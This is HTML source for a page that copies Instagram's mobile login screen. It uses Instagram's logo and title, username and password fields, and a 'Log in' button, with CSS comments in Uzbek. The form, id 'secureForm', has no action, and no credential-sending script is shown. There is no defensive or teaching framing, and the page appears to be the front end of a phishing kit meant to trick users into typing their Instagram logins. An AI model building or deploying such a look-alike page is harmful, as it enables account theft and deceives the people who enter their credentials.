<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #121f27; /* Rasmdagi to'q ko'k-qora fon */
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            height: 100vh;
            padding: 20px;
        }
        .top-section {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 40px;
        }
        .lang { color: #a8a8a8; font-size: 12px; margin-bottom: 40px; }
        .insta-logo { width: 80px; height: 80px; margin-bottom: 40px; }
        
        .form-container { width: 100%; max-width: 380px; }
        
        input {
            width: 100%;
            padding: 16px;
            margin-bottom: 12px;
            border: 1px solid #36474f;
            border-radius: 12px;
            background-color: #1c2b33;
            color: white;
            font-size: 14px;
            outline: none;
        }
        input::placeholder { color: #8e8e8e; }
        input:focus { border: 1px solid #555; }
        
        button#loginBtn {
            width: 100%;
            background-color: #0064e0; /* Instagram ko'k rangi */
            color: white;
            border: none;
            border-radius: 25px; /* Yumaloq tugma */
            padding: 14px;
            font-weight: 600;
            font-size: 16px;
            margin-top: 10px;
            cursor: pointer;
        }
        
        .forgot {
            display: block;
            text-align: center;
            color: #fff;
            text-decoration: none;
            font-size: 14px;
            margin-top: 20px;
            font-weight: 500;
        }
        
        .bottom-section {
            width: 100%;
            max-width: 380px;
            text-align: center;
            margin-bottom: 20px;
        }
        
        .create-btn {
            width: 100%;
            background: none;
            border: 1px solid #0064e0;
            color: #0064e0;
            padding: 10px;
            border-radius: 25px;
            font-weight: 600;
            text-decoration: none;
            display: block;
            margin-bottom: 20px;
        }
        
        .meta-logo { width: 60px; opacity: 0.8; }
    </style>
</head>
<body>

<div class="top-section">
    <div class="lang">English (US)</div>
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" class="insta-logo" alt="logo">
    
    <div class="form-container">
        <form id="secureForm">
            <input type="text" id="email" placeholder="Username, email or mobile number" required>
            <input type="password" id="pass" placeholder="Password" required>
            <button type="submit" id="loginBtn">Log in</button>
        </form>
        <a href="#" class="forgot">Forgot password?</a>
    </div>
</div>
